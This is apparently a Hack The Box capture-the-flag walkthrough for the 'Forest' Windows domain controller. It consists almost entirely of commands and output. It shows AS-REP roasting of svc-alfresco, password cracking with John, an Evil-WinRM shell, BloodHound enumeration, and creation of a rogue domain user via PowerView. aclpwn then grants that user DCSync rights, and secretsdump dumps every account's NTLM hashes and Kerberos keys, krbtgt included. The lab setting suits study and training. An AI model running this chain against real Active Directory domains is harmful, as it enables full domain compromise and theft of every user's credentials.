
[logo]: https://github.com/Zer0CodeX/Hack-The-Box/raw/master/Forest.png
![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/Forest.png "Forest")

## NMAP:

```console
root@test:~/HTB/Forest# nmap --top-ports 10000 -sV -sC -O -oN forest_nmap 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-23 08:37 EET
Nmap scan report for FOREST.htb.local (10.10.10.161)
Host is up (0.36s latency).
Not shown: 8306 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-23 06:48:39Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/23%Time=5E293FE8%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/23%OT=53%CT=1%CU=40345%PV=Y%DS=2%DC=I%G=Y%TM=5E29410
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%CI=RD%II=I%TS=A)SEQ(SP=
OS:102%GCD=1%ISR=109%TI=RD%II=I%TS=B)SEQ(SP=102%GCD=1%ISR=109%TI=RD%CI=RD%I
OS:I=I%TS=A)OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW8ST1
OS:1%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000
OS:%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54BNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h48m05s, deviation: 4h37m11s, median: 8m03s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-01-22T22:51:26-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-01-23T06:51:24
|_  start_date: 2020-01-23T05:20:10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 500.27 seconds
```
## Impacket: GetADUsers.py
```console
root@test:~/tools/Windows/impacket/examples# python GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/ | cut -d " " -f 1 |tee /root/HTB/Forest/users
Impacket

[*]
Name
--------------------
Administrator
Guest
DefaultAccount
krbtgt
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
jan
```
## Impacket: GetNPUsers.py
```console
root@test:~/tools/Windows/impacket/examples# python GetNPUsers.py htb.local/ -usersfile /root/HTB/Forest/users -dc-ip 10.10.10.161 -format hashcat -outputfile /root/HTB/Forest/hashes
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] invalid principal syntax
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jan doesn't have UF_DONT_REQUIRE_PREAUTH set
```
```console
root@test:~/tools/Windows/impacket/examples# cat /root/HTB/Forest/hashes
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ead9ec2fc260fbda2f1697e3bd855564$c57e09ec984c5d72a66989c63b90c68eac5b309a4cb82890b4734dfc169c5f456ee9ef6ccc21d490d56a30ee0ed7cd13031b29f518d19a8a38780c64fe62f12db584b6f164cf47b9b2e2360983a16deebd8f43562a04edfa8bf5e9aeab56ae74eadec7df54845f4ce3b42609e36a222e56ac6ae23a2b4c8435d90ceb0d2c6526ccae1af3ea0e5d23003be8aefbbd407a4de36a35fb7056d06e503592a63878adbd9f80a979010a261ef397b55eae05daaeedb2ce3d2c8c6b21e815d8eeb4db5d4820b7ddccd44ad1c169828f6a95d16c68cca0c3cff32a08af39b917f9382bbe723e24e0df69
```
## John The Ripper
```console
root@test:~/tools/Windows/impacket/examples# john /root/HTB/Forest/hashes --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:14 DONE (2020-01-23 10:52) 0.06988g/s 285517p/s 285517c/s 285517C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

## Evil-WinRM
```console
root@test:~/tools/Windows/evil-winrm# ruby evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

## BloodHound
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1
Info: Uploading /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1                                                                                   

Data: 1226060 bytes of 1226060 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -Domain HTB -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All -DomainController Forest.htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        1/23/2020   1:13 AM          12930 20200123011306_BloodHound.zip                                                                                                                                                                           
-a----        1/23/2020   1:13 AM           9028 Rk9SRVNU.bin                                                                                                                                                                                            
-a----        1/23/2020   1:10 AM         919546 SharpHound.ps1                                                                                                                                                                                          


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200123011306_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\Documents\20200123011306_BloodHound.zip to 20200123011306_BloodHound.zip                                                                                            

Info: Download successful!
```
```console
root@test:/usr/share/neo4j/bin# neo4j start
Active database: graph.db
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
Started neo4j (pid 195060). It is available at http://localhost:7474/
There may be a short delay until the server is ready.
See /usr/share/neo4j/logs/neo4j.log for current status.
root@test:/usr/share/neo4j/bin# bloodhound
```


#### Shortest Path to Domain Admins: 
![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound.png "BloodHound")

## ACLPwn.py
```console
root@test:~/HTB/Forest# aclpwn -f svc-alfresco -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry
[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
[-] Invalid path, skipping
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
Please choose a path [0-1] 
```
##  PowerView
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/PowerSploit/Recon/PowerView.ps1
Info: Uploading /root/tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1                                                                                                

Data: 1027040 bytes of 1027040 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $UserPassword = ConvertTo-SecureString 'zerocode' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> New-DomainUser -SamAccountName zer0code -Description 'my test' -AccountPassword $UserPassword


GivenName                         : 
MiddleName                        : 
Surname                           : 
EmailAddress                      : 
VoiceTelephoneNumber              : 
EmployeeId                        : 
AdvancedSearchFilter              : System.DirectoryServices.AccountManagement.AdvancedFilters
Enabled                           : True
AccountLockoutTime                : 
LastLogon                         : 
PermittedWorkstations             : {}
PermittedLogonTimes               : 
AccountExpirationDate             : 
SmartcardLogonRequired            : False
DelegationPermitted               : True
BadLogonCount                     : 0
HomeDirectory                     : 
HomeDrive                         : 
ScriptPath                        : 
LastPasswordSet                   : 1/23/2020 11:20:01 AM
LastBadPasswordAttempt            : 
PasswordNotRequired               : False
PasswordNeverExpires              : False
UserCannotChangePassword          : False
AllowReversiblePasswordEncryption : False
Certificates                      : {}
Context                           : System.DirectoryServices.AccountManagement.PrincipalContext
ContextType                       : Domain
Description                       : my test
DisplayName                       : zer0code
SamAccountName                    : zer0code
UserPrincipalName                 : 
Sid                               : S-1-5-21-3072663084-364016917-1341370565-7601
Guid                              : 8ff5b1ee-f8b1-4370-a221-5897f07c5915
DistinguishedName                 : CN=zer0code,CN=Users,DC=htb,DC=local
StructuralObjectClass             : user
Name                              : zer0code



*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members zer0code
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -Domain HTB -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All -DomainController Forest.htb.local
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        1/23/2020   3:21 AM          12933 20200123032135_BloodHound.zip                                                                                                                                                                           
-a----        1/23/2020   3:19 AM         770280 PowerView.ps1                                                                                                                                                                                           
-a----        1/23/2020   3:21 AM           9038 Rk9SRVNU.bin                                                                                                                                                                                            
-a----        1/23/2020   2:35 AM         779776 SharpHound.exe                                                                                                                                                                                          
-a----        1/23/2020   1:53 AM         919546 SharpHound.ps1                                                                                                                                                                                          


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200123032135_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\Documents\20200123032135_BloodHound.zip to 20200123032135_BloodHound.zip                                                                                            

Info: Download successful!

```
#### Shortest Path from Zer0Code to Domain Admins: 
![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound2.png "BloodHound")

```console
root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry
[+] Path found!
Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[+] Path validated, the following modifications are required for exploitation in the current configuration:
[-] Modifying domain DACL to give DCSync rights to ZER0CODE
```

```console
root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -s 10.10.10.161
Please supply the password or LM:NTLM hashes of the account you are escalating from: 
[+] Path found!
Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[-] Memberof -> continue
[-] Modifying domain DACL to give DCSync rights to ZER0CODE
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20200123-132645.restore
```

## Impacket: secretsdump.py
```console
root@test:~/tools/Windows/impacket/examples# python secretsdump.py -dc-ip 10.10.10.161 htb.local/zer0code:zerocode@10.10.10.161 -outputfile hashes.txt
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
zer0code:7601:aad3b435b51404eeaad3b435b51404ee:a3bd79d4416e063c6eacc3c3e98f3f89:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:462d22dc2c4d66e492d33cebe235360b:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
zer0code:aes256-cts-hmac-sha1-96:8049a37248d8b71483f385842cfe4cc7a5dcbd74b2925fe5e6a7cd98befd923e
zer0code:aes128-cts-hmac-sha1-96:8071a1bb637e6059809fa5d08ad63958
zer0code:des-cbc-md5:4020347c52f7e9dc
FOREST$:aes256-cts-hmac-sha1-96:b2e43b4c1055b2357ab0f20cb2dea58ed2e4627fc061d44d9a23e89c45926378
FOREST$:aes128-cts-hmac-sha1-96:5d71abdcf0bad5cf94595e7bfe442133
FOREST$:des-cbc-md5:f762372664a202d6
